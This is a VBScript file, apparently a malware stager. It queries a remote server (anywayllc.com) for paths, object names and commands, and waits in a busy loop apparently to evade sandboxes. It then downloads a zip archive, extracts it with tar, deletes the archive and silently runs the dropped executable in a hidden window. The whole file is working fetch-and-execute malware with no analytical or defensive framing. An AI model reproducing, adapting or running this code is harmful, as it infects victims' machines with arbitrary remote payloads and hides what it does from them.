Dim h, s, f, d, t, e, z, k, i, p, a, b
Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
Set s = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
p = "http://anywayllc.com/ery/?s="

h.Open "GET", p & "up", False
h.Send
d = s.ExpandEnvironmentStrings(h.responseText)

h.Open "GET", p & "tp", False
h.Send
t = s.ExpandEnvironmentStrings(h.responseText)

h.Open "GET", p & "exe", False
h.Send
e = h.responseText

k = Timer
Do While Timer - k < 24
    For i = 1 To 5000
        a = "x,y,z,w,a,b,c,d,e,f" & i
        b = Split(a, ",")
        b = Join(b, "|")
        b = StrReverse(b)
        b = Replace(b, "|", "-")
    Next
Loop

h.Open "GET", p & "wh", False
h.Send
Set h2 = CreateObject(h.responseText)

h.Open "GET", p & "url", False
h.Send
h2.Open "GET", h.responseText, False
h2.SetTimeouts 60000, 60000, 300000, 600000
h2.Send

h.Open "GET", p & "st", False
h.Send
Set st = CreateObject(h.responseText)
st.Type = 1
st.Open
st.Write h2.ResponseBody
z = f.BuildPath(t, "g1.zip")
st.SaveToFile z, 2
st.Close

h.Open "GET", p & "tar", False
h.Send
s.Run h.responseText & " """ & z & """ -C """ & d & """ 2>nul", 0, True

On Error Resume Next : f.DeleteFile z, True : On Error Goto 0

If f.FileExists(f.BuildPath(d, e)) Then
    s.CurrentDirectory = d
    h.Open "GET", p & "start", False
    h.Send
    s.Run h.responseText & " """" """ & f.BuildPath(d, e) & """", 0, False
End If
